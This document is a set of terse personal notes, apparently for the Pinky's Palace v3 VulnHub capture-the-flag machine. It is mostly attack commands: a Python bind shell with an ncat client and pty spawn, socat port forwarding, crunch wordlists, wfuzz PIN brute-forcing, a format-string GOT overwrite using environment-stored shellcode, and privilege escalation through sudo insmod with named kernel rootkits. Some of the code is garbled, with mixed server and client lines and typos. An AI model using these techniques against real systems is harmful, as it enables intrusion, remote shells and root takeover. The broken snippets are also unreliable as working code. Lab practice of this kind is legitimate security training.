1. drupal7 < 7.58 has exploit
2. bind the shell in victim machine
    2.1 server
        -> python -c 'import socket as a; s=a.socket();s.bind(("ip",1234))'
                s.listen(1); r,c=s.accept();execv(r.recv(999))
    2.2 client
        -> ncat -v ip 1234
            import pty,os; os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);
            pty.spawn("/bin/bash"); s.close();
3. socat make  port forward
    3.1 socat TCP-LISTEN:8000,reuseaddr,fork TCP-CONNETC:localhost:80 &

4. crunch is useful tools
    4.1 crunch for alpha
        crunch 1 5 /usr/share/crunch/charset.lst alpha -o chardicty
    4.2 crunch for numeric
        crunch 5 5 /usr/share/crunch/charset.lst  numberic -o numberic

5. wfuzz for pin
    wfuzz -c -z file,./numberic -d 'user=pinkadmin&pass=somethingidonknow&pin=FUZZ' --hh 45 -u url

6. make a share libary
    gcc -fPIC -shared libpinksec.so  libpinksec.c
    if the system is i386;
    use the gcc -m32 instead of gcc

7. format string payload
    7.1 export SHELL='xxxx'(shellcode)
    7.2 ./getenvaddr SHELL /usr/local/bin/PSMCCLI
    7.3 for i in {1..200}; do echo -n $i;/usr/local/bin/PSMCCLI AAABBBCC%$i\$x;read p ;done
    7.4 about 7.3->  $x,sometime use $p instead it, AAABBBCCC use to adjust the memory
        you can use AAA or BB or CC or AAABBBCCC or anything, if you have fun.
    7.5 write the memory
        7.5.1 objdump -R /usr/local/bin/PSMCCLI to find the got
        7.5.2 for example got is  0x0804a01c
            first part is 0x0804a01c
            second part is 0x0804a01e(first + 2)
        7.5.3 if the memery 0xbfffff4e that you want to write
            first size is 0xff4e - 8(addr1c plus addr1e have 8 byte size ) - sizeof(adjust memory)
            seconde is 0x1bfff - 0xff4e , so you can write the memory now. be fun . hahaha !
8. root (NOPASSWD) /sbin/insmod
   root (NOPASWD) /sbin/remod

    how to get root !
    two way !
    one : https://github.com/PinkP4nther/Pinkit
    two : https://github.com/m0nad/Diamorphine

9. how to through pinky
    9.1 https://hackso.me/pinkys-palace-v3-walkthrough/
    9.2 https://medium.com/egghunter/pinkys-palace-v3-vulnhub-walkthrough-619344a21efe
